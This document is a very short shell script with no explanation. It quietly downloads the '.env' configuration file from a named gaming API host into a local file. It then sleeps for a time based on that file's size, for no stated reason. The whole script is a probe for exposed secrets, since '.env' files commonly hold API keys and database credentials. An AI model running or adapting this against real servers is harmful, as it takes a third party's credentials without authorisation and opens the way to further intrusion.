#!/bin/sh
curl -s -o /w5 https://playerapi.hubgaming.com/.env
sleep $(( 20 + $(wc -c </w5) / 128 ))
